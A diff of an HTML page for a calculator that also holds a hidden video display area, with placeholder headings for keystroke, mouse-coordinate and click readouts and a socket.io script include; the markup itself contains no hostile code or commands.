@@ -9,9 +9,9 @@
 </head>
   
 <body class="h-100">
-  <div class="h-100" id="calculator">
-    <h1>Calculator</h1>
+  <h1 id="calcTitle">Calculator</h1>
 
+  <div class="h-100" id="calculator">
     <div id="numberInput">
       <input type="number" id="numberField">
       <button onclick="submitNumber()">Submit</button>
@@ -24,18 +24,17 @@
       <button onclick="divOp()">Divide</button>
     </div>
   </div>
-    
-  <div class="h-100" id="video_display">
-	  <div id ="video_container" class="align-items-center" style="margin-top: 10%;">
-      <div class="local_div" id="div1" style="">
-  			<!-- For playing local video -->
-  			<video id="localVideo" class="" autoplay muted playsinline></video>
-  		</div>
-  		<div class="remote_div" id="div2">
-  			<!-- For playing local audio -->
-  			<video id="remoteVideo" class="" autoplay playsinline></video>
-  		</div>
+
+  <div id="video_display" style="display: none">
+    <div class="h-100">
+      <div id ="video_container" class="align-items-center" style="margin-top: 10%;">
+        <video id="video" class="" autoplay playsinline></video>
+      </div>
     </div>
+    <button onclick="goFullscreen()">View Fullscreen!</button>
+    <h1 id="keyStrock"></h1>
+    <h1 id="mouseCords"></h1>
+    <h1 id="click"></h1>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
